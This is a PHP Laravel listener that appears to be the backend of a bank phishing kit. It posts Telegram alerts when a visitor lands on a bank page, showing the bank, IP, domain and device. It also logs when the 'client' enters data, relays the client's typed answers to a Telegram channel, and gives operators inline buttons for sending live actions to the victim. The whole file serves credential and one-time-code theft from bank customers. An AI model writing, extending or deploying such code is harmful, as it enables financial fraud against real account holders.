<?php

namespace App\Listeners;

use App\Events\BankSessionCreated;
use App\Events\BankSessionUpdated;
use App\Events\PreSessionCreated;
use App\Models\Admin;
use App\Models\PreSession;
use Illuminate\Support\Facades\Cache;
use App\Services\Telegram\TelegramCardBuilder;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

class NotifyAdminsOfBankSession
{
    public function __construct(
        private readonly Nutgram $bot,
        private readonly TelegramCardBuilder $builder,
    ) {
    }

    public function handleCreated(BankSessionCreated $event): void
    {
        $session = $event->session;

        if (!Cache::add('session-created:' . $session->id, true, 60)) {
            return;
        }

        if ($session->telegram_message_id !== null) {
            $this->handleUpdated(new BankSessionUpdated($session));
            return;
        }

        $text     = $this->builder->buildCardText($session);
        $keyboard = $this->builder->buildKeyboard($session);

        $admins = Admin::where('is_active', true)
            ->get()
            ->unique('telegram_user_id');
        foreach ($admins as $admin) {
            try {
                $msg = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $keyboard,
                );
                if ($session->telegram_message_id === null && $msg !== null) {
                    $session->telegram_message_id = $msg->message_id;
                    $session->telegram_chat_id    = $admin->telegram_user_id;
                    $session->save();
                }
            } catch (\Throwable $e) {
                logger()->warning('Failed to deliver card to admin', [
                    'admin_id'   => $admin->id,
                    'session_id' => $session->id,
                    'error'      => $e->getMessage(),
                ]);
            }
        }
    }

    public function handleUpdated(BankSessionUpdated $event): void
    {
        $session = $event->session;
        if ($session->telegram_chat_id === null || $session->telegram_message_id === null) {
            return;
        }
        $text = $this->builder->buildCardText($session);
        $keyboard = $this->builder->buildKeyboard($session);
        try {
            $this->bot->editMessageText(
                text: $text,
                chat_id: $session->telegram_chat_id,
                message_id: $session->telegram_message_id,
                parse_mode: 'HTML',
                reply_markup: $keyboard,
            );
        } catch (\Throwable $e) {
            logger()->warning('Failed to edit card', [
                'session_id' => $session->id,
                'error' => $e->getMessage(),
            ]);
        }
    }

    public function handlePreSession(PreSessionCreated $event): void
    {
        $preSession = $event->preSession;

        if (!Cache::add('presession-sent:' . $preSession->id, true, 60)) {
            return;
        }

        $ip     = $preSession->ip_address ?? '-';
        $bank   = $preSession->bank_slug ?? '-';
        $domain = $preSession->page_url ? parse_url($preSession->page_url, PHP_URL_HOST) : null;
        $device = match($preSession->device_type) {
            'iphone'  => '📱 iPhone',
            'ipad'    => '📱 iPad',
            'android' => '📱 Android',
            'windows' => '🖥️ Windows',
            'macos'   => '🍎 macOS',
            'linux'   => '🐧 Linux',
            default   => '🖥️ ПК',
        };

        $domainLine = $domain ? "\n🌐 {$domain}" : '';
        $text = <<<HTML
🛰 <b>Новый посетитель</b>

🏦 Банк: <b>{$bank}</b>
🌍 IP: <code>{$ip}</code>{$domainLine}
{$device}
Онлайн
HTML;

        $channelId = config('services.telegram.notify_channel');
        if ($channelId) {
            try {
                $this->bot->sendMessage(
                    text: $text,
                    chat_id: $channelId,
                    parse_mode: 'HTML',
                );
            } catch (\Throwable $e) {
                logger()->warning('Failed to send pre-session to channel', ['error' => $e->getMessage()]);
            }
        }
    }

    public function sendToChannel(string $text): void
    {
        $channelId = config('services.telegram.notify_channel');
        if (!$channelId) {
            return;
        }
        try {
            $this->bot->sendMessage(
                text: $text,
                chat_id: $channelId,
                parse_mode: 'HTML',
            );
        } catch (\Throwable $e) {
            logger()->warning('Failed to send to channel', ['error' => $e->getMessage()]);
        }
    }

    private function logTag(\App\Models\BankSession $session): string
    {
        return $session->log_number !== null ? "#log{$session->log_number}" : '';
    }

    private function domainLine(\App\Models\BankSession $session): string
    {
        return $session->domain ? "\n🌐 {$session->domain}" : '';
    }

    public function notifyCredentialsEntered(\App\Models\BankSession $session): void
    {
        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
        $tag    = $this->logTag($session);
        $domain = $this->domainLine($session);
        $this->sendToChannel(
            "📝 <b>Клиент ввёл данные</b>  {$tag}\n\n" .
            "🏦 {$bank}{$domain}"
        );
    }

    public function notifyActionSent(\App\Models\BankSession $session, string $actionLabel): void
    {
        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
        $tag    = $this->logTag($session);
        $domain = $this->domainLine($session);
        $this->sendToChannel(
            "📤 <b>Действие отправлено клиенту</b>  {$tag}\n\n" .
            "🏦 {$bank}{$domain}\n" .
            "📋 {$actionLabel}"
        );
    }

    public function notifyClientAnswer(\App\Models\BankSession $session, string $command, string $value): void
    {
        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
        $tag    = $this->logTag($session);
        $domain = $this->domainLine($session);
        $this->sendToChannel(
            "📥 <b>Ответ клиента</b>  {$tag}\n\n" .
            "🏦 {$bank}{$domain}\n" .
            "📋 {$command}\n" .
            "💬 <code>{$value}</code>"
        );
    }
}
